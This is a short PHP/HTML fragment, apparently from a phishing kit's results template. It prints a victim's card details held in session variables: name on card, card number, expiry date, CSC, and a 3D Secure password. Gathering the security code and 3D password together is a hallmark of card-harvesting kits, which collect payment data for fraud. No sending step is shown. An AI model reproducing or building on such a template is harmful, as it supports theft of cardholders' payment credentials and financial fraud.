...
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">Card Number</h2>
<h2>Name On Card      : '.$_SESSION["NameOnCard"].' </h2>
<h2>Card Number       : '.$_SESSION["cardnumber"].' </h2>
<h2>Expiration Date   : '.$_SESSION["expdate"].' </h2>
<h2>CSC (3 digits)    : '.$_SESSION["thDSecure"].' </h2>
<h2>3D Password       : '.$_SESSION["Securitycode"].' </h2>
